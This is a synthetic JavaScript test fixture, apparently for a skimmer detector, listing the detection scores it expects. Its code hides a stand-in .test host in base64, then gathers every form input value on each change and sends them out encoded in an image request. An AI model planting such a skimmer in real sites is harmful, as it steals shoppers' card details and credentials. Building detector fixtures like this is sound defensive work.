// Synthetic test fixture: not functional malware. Hosts use the reserved .test TLD.
// context: script_host=cdn.vendor.test site=shop.example.test
// expect: exfil.hidden_destination=high skimmer.form_data=high obfuscation.packed=medium
var u = atob("aHR0cHM6Ly9jZG4tc3RhdHMuc2tpbS50ZXN0L2cuZ2lm");
document.addEventListener("change", function () {
  var values = [];
  document.querySelectorAll("input").forEach(function (i) { values.push(i.value); });
  var img = new Image();
  img.src = u + "?d=" + btoa(values.join("|"));
});
